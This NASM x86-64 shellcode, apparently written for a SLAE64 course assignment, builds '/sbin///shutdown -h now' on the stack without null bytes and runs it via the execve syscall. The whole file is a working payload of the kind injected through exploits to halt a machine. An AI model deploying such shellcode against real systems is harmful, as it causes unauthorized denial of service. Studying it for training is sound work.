; File: shutdown.nasm
; Author: 
; Purpose: SLAE64 assignment6, issuing shutdown -h now command with execve

; syscall needed: execve 59
; 		  execve(const char *path, char *const argv[], char *const envp[])

; command issuing: shutdown
; arguments: 		    -h now


; registers needed: rax 	syscall
; 		    rdi		first arg	address pointed to null terminated path for command issuing
; 		    rsi		second arg
; 		    rdx	 	third arg 	


; stack: low <- | rdi | address of -h | address of "now" | NULL | /sbin/shutdown | NULL | <- high
; 	        ^ rsi					        ^ rdi	       	 ^ rdx

global _start
section .text

_start: 
	xor rax, rax			; zeroing out registers
	
	push rax			; push first NULL

	mov rdx, rsp			; *third execve argument*

	mov r10, 0x6e776f6474756873
	mov r11, 0x2f2f2f6e6962732f
	push r10			; push /sbin///shutdown in reverse hex
	push r11			

	mov rdi, rsp			; *first execve argument*

					; preparing for *second execve argument*
	xor r12, r12			; second command option value
	mov r12d, 0x776f6e		; now in reverse hex

	xor r13, r13			; first command option flag 
	mov r13w, 0x682d		; -h in reverse hex

	push r12			; second command option value: now
	mov r14, rsp			; second command option value address in r14
	push r13			; first command option flag: -h
	mov r15, rsp			; first command option flag address in r15

	push rax			; last command option 00 NULL terminated
	push r14			; address of now
	push r15			; address of -h
	push rdi			; address of /sbin///shutdownNULL

	mov rsi, rsp			; *second execve argument*
	
	mov al, 59
	syscall				; execve invocation



